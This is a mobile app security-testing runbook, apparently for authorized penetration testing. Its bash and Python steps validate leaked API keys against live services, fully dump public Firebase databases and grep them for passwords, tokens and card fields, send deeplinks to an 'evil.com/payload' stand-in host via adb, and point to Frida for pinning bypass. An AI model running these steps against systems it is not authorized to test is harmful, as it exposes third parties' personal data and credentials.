# Mobile Security — Runbook 03: Verify

## Purpose
High-confidence verification of mobile security findings: validate exposed API keys with real impact, confirm public Firebase databases, test deeplink hijacking, verify certificate pinning bypass viability.

## Variables
- `$APK_PATH` — path to APK/IPA
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — evidence directory

---

## W3.1 — Verify API key impact (comprehensive check)

```bash
EVIDENCE_DIR="$OUTDIR/mobile/evidence"
mkdir -p "$EVIDENCE_DIR"

# Test all discovered keys
python3 -c "
import re, urllib.request, json

with open('$OUTDIR/mobile/secrets-strings.txt') as f:
    content = f.read()

# Extract patterns
google_maps = re.findall(r'AIza[0-9A-Za-z_-]{35}', content)
aws_keys = re.findall(r'AKIA[0-9A-Z]{16}', content)
firebase_urls = re.findall(r'[a-zA-Z0-9-]+\.firebaseio\.com', content)

results = []

# Test Google Maps
for key in google_maps[:1]:
    try:
        resp = urllib.request.urlopen(f'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key}')
        data = json.loads(resp.read())
        results.append(f'Google Maps {key[:10]}...: status={data.get(\"status\")}')
    except Exception as e:
        results.append(f'Google Maps {key[:10]}...: ERROR {e}')

# Test Firebase databases
for fb in firebase_urls[:3]:
    try:
        resp = urllib.request.urlopen(f'https://{fb}/.json')
        data = json.loads(resp.read().decode())
        if isinstance(data, dict) and len(data) > 0:
            results.append(f'Firebase {fb}: PUBLIC ({len(data)} top-level keys)')
        elif data is None:
            results.append(f'Firebase {fb}: Empty (null)')
        else:
            results.append(f'Firebase {fb}: Data found ({type(data).__name__})')
    except Exception as e:
        results.append(f'Firebase {fb}: {e}')

for r in results:
    print(r)
" > "$EVIDENCE_DIR/verified-keys.txt"

cat "$EVIDENCE_DIR/verified-keys.txt"
```

## W3.2 — Verify AWS key permissions

```bash
AWS_KEY=$(grep -oiE 'AKIA[0-9A-Z]{16}' "$OUTDIR/mobile/secrets-strings.txt" | head -1)
if [ -n "$AWS_KEY" ]; then
  echo "AWS Key found: $AWS_KEY"
  echo "SAFETY: DO NOT test AWS keys with aws-cli unless explicitly authorized."
  echo "Instead, save for reporting with key partially redacted."
  echo "${AWS_KEY:0:6}...${AWS_KEY: -4}" > "$EVIDENCE_DIR/aws-key-redacted.txt"
fi
```

## W3.3 — Verify Firebase database public access (full dump)

```bash
FIREBASE_URL=$(head -1 "$OUTDIR/mobile/firebase-urls.txt" 2>/dev/null)

if [ -n "$FIREBASE_URL" ]; then
  echo "=== Full Firebase dump: $FIREBASE_URL ==="
  curl -s "$FIREBASE_URL/.json" -o "$EVIDENCE_DIR/firebase-full-dump.json" 2>/dev/null

  python3 -c "
import json

with open('$EVIDENCE_DIR/firebase-full-dump.json') as f:
    data = json.load(f)

if isinstance(data, dict):
    print(f'Top-level collections: {list(data.keys())}')
    for k, v in list(data.items())[:3]:
        val_type = type(v).__name__
        val_len = len(v) if isinstance(v, (dict, list)) else 'N/A'
        print(f'  {k}: {val_type} (length: {val_len})')
        if isinstance(v, dict):
            sample = list(v.values())[:1]
            print(f'    Sample: {json.dumps(sample)[:200]}')
elif isinstance(data, list):
    print(f'Root is array with {len(data)} items')
    print(f'Sample: {json.dumps(data[:1])[:200]}')
else:
    print(f'Data type: {type(data).__name__}')
    print(f'Content: {str(data)[:200]}')
" 2>/dev/null

  # Check for sensitive fields
  grep -oiE '(email|password|token|phone|address|ssn|credit|card|secret|key|admin|role)' \
    "$EVIDENCE_DIR/firebase-full-dump.json" | sort | uniq -c | sort -rn > "$EVIDENCE_DIR/firebase-sensitive-fields.txt"
  echo "=== Sensitive field frequencies ==="
  cat "$EVIDENCE_DIR/firebase-sensitive-fields.txt"
fi
```

## W3.4 — Verify deeplink hijacking

```bash
# If adb device is connected and package name is known
if adb devices 2>/dev/null | grep -q 'device$'; then
  PACKAGE_NAME=$(grep -oiE 'package="([^"]*)"' "$OUTDIR/mobile/decompiled/apktool/AndroidManifest.xml" 2>/dev/null | grep -o '"[^"]*"' | tr -d '"' | head -1)

  if [ -n "$PACKAGE_NAME" ]; then
    echo "=== Deeplink testing for $PACKAGE_NAME ==="

    while IFS= read -r scheme; do
      clean_scheme=$(echo "$scheme" | tr -d '://')
      echo "--- Testing: ${clean_scheme}://evil.com/payload ---"
      adb shell am start -W -a android.intent.action.VIEW \
        -d "${clean_scheme}://evil.com/payload" "$PACKAGE_NAME" 2>&1 | grep -E '(Status|Error|Warning)' | head -5
      adb logcat -d | grep -i "$PACKAGE_NAME" | tail -5
    done < "$OUTDIR/mobile/deeplink-schemes.txt" > "$EVIDENCE_DIR/deeplink-test-results.txt"

    cat "$EVIDENCE_DIR/deeplink-test-results.txt"
  fi
else
  echo "No ADB device. Deeplink schemes for manual testing:"
  cat "$OUTDIR/mobile/deeplink-schemes.txt"
fi
```

## W3.5 — Verify certificate pinning status

```bash
# Check if network_security_config.xml allows cleartext or custom CAs
if grep -qiE '(cleartextTrafficPermitted|trust-anchors|certificates.*src.*user|certificates.*src.*system)' \
  "$OUTDIR/mobile/network-security-config.txt" 2>/dev/null; then
  echo "VULNERABLE: Network security config allows interceptable traffic"
  grep -iE '(cleartext|trust-anchor|user|certificate)' "$OUTDIR/mobile/network-security-config.txt" \
    > "$EVIDENCE_DIR/cert-pinning-bypass.txt"
  cat "$EVIDENCE_DIR/cert-pinning-bypass.txt"
else
  echo "Certificate pinning likely enforced."
  echo "To bypass: use objection 'android sslpinning disable' or Frida script."
fi
```

---

## Stop Conditions

| Condition | Reason |
|---|---|
| API keys all return "restricted" or "API key not valid" | Keys are limited or invalid |
| Firebase .json returns 401/403 "Permission denied" | Firebase security rules properly configured |
| No deeplinks found | No deeplink surface |
| Certificate pinning enforced with no user CA trust | Requires root/Frida -- document but cannot verify further |

---

## Next Routing

| Result | Route |
|---|---|
| Valid API keys with real service access | -> 04-impact-escalation.md |
| Public Firebase with user data | -> 04-impact-escalation.md |
| Dex2Jar/Java code reveals business logic flaws | -> Route to appropriate vuln skill |
| Deeplink hijacking possible | -> 04-impact-escalation.md |
| Certificate pinning bypassable | -> 04-impact-escalation.md (traffic interception) |

---

## Output Files

| File | Contents |
|---|---|
| $EVIDENCE_DIR/verified-keys.txt | API key validation results |
| $EVIDENCE_DIR/aws-key-redacted.txt | Redacted AWS key for report |
| $EVIDENCE_DIR/firebase-full-dump.json | Complete Firebase database dump |
| $EVIDENCE_DIR/firebase-sensitive-fields.txt | Sensitive field frequencies |
| $EVIDENCE_DIR/deeplink-test-results.txt | ADB deeplink test output |
| $EVIDENCE_DIR/cert-pinning-bypass.txt | Certificate pinning vulnerability evidence |
